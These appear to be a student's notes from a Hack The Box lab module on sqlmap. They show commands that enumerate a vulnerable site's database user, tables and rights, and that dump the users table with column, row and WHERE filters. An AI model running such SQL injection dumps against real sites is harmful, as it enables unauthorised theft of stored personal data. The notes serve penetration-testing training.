## Basic DB Data Enumeration

Enumeration usually starts with the retrieval of the basic information:

- Database version banner (switch `--banner`)
- Current user name (switch `--current-user`)
- Current database name (switch `--current-db`)
- Checking if the current user has DBA (administrator) rights (switch `--is-dba`)

```shell
3kjS@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba
```
## Table Enumeration

```shell
3kjS@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --tables -D testdb
```
![](Screenshot%202026-06-23%20at%2012.54.22.png)

```shell
3kjS@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb
```
![](Screenshot%202026-06-23%20at%2012.54.43.png)
## Table/Row Enumeration

```shell
3kjS@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname
```
![](Screenshot%202026-06-23%20at%2012.55.21.png)

```shell
3kjS@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --start=2 --stop=3
```
![](Screenshot%202026-06-23%20at%2012.55.42.png)
## Conditional Enumeration

```shell
3kjS@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"
```
![](Screenshot%202026-06-23%20at%2012.56.08.png)
